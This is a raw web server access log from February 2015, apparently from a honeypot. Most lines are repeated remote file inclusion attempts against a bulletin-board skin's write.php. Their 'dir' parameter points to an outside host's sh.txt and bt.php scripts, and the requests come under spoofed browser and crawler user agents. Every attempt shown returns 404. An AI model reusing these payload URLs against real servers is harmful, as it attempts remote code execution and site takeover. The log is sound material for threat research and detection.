112.218.68.155 - - [22/Feb/2015:21:14:26 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
211.47.181.38 - - [22/Feb/2015:21:14:27 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
112.218.68.155 - - [22/Feb/2015:21:14:28 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [22/Feb/2015:21:14:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [22/Feb/2015:21:14:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [22/Feb/2015:21:14:28 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
211.47.181.38 - - [22/Feb/2015:21:14:29 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
112.218.68.155 - - [22/Feb/2015:21:14:30 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [22/Feb/2015:21:14:30 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
71.6.150.241 - - [22/Feb/2015:21:14:58 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [22/Feb/2015:21:14:59 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [22/Feb/2015:21:14:59 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
80.68.145.110 - - [22/Feb/2015:21:14:59 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
71.6.150.241 - - [22/Feb/2015:21:15:00 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
80.68.145.110 - - [22/Feb/2015:21:15:00 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [22/Feb/2015:21:15:00 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
211.47.181.38 - - [22/Feb/2015:21:15:05 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [22/Feb/2015:21:15:06 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [22/Feb/2015:21:15:06 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
80.68.145.110 - - [22/Feb/2015:21:15:07 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
211.47.181.38 - - [22/Feb/2015:21:15:08 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
114.202.2.31 - - [22/Feb/2015:21:15:14 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [22/Feb/2015:21:15:15 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [22/Feb/2015:21:15:17 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:18 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:18 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:19 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
114.202.2.31 - - [22/Feb/2015:21:15:21 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [22/Feb/2015:21:15:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [22/Feb/2015:21:15:49 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:50 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:50 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [22/Feb/2015:21:15:51 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
80.68.145.110 - - [22/Feb/2015:21:15:56 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [22/Feb/2015:21:15:58 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [22/Feb/2015:21:15:58 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [22/Feb/2015:21:16:09 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
80.68.145.110 - - [22/Feb/2015:21:16:09 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [22/Feb/2015:21:16:20 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
80.68.145.110 - - [22/Feb/2015:21:16:26 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:27 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:27 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:29 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:31 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
80.68.145.110 - - [22/Feb/2015:21:16:36 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:37 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
80.68.145.110 - - [22/Feb/2015:21:16:38 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:38 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
80.68.145.110 - - [22/Feb/2015:21:16:39 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
176.31.252.38 - - [22/Feb/2015:21:17:26 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:21:17:27 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:21:17:27 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:21:17:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [22/Feb/2015:21:17:37 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:21:17:38 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:21:17:39 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [22/Feb/2015:21:17:40 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.47.181.38 - - [22/Feb/2015:21:18:07 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
211.47.181.38 - - [22/Feb/2015:21:18:09 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
211.47.181.38 - - [22/Feb/2015:21:18:09 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
211.47.181.38 - - [22/Feb/2015:21:18:10 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
176.31.252.38 - - [22/Feb/2015:21:19:03 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:21:19:04 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:21:19:04 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [22/Feb/2015:21:19:05 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
80.68.145.110 - - [22/Feb/2015:21:20:00 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:01 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:02 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:08 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:11 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:13 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:13 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
80.68.145.110 - - [22/Feb/2015:21:20:14 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
104.130.161.115 - - [22/Feb/2015:21:24:53 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [22/Feb/2015:21:24:53 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [22/Feb/2015:21:24:54 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [22/Feb/2015:21:24:54 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [22/Feb/2015:21:24:58 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.113 - - [22/Feb/2015:21:24:58 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [22/Feb/2015:21:24:59 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.114 - - [22/Feb/2015:21:24:59 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
213.175.115.28 - - [22/Feb/2015:21:31:54 -0800] "GET / HTTP/1.1" 200 6788 "http://t.co/ZG4qW9wJfX" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
176.31.252.38 - - [22/Feb/2015:21:47:29 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:30 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:31 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:32 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:32 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:33 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:33 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:47:34 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [22/Feb/2015:21:54:01 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:02 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:02 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:03 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:03 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:05 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:05 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:54:06 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [22/Feb/2015:21:56:23 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:24 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:24 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:25 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:25 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:27 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:27 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:56:28 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [22/Feb/2015:21:59:18 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
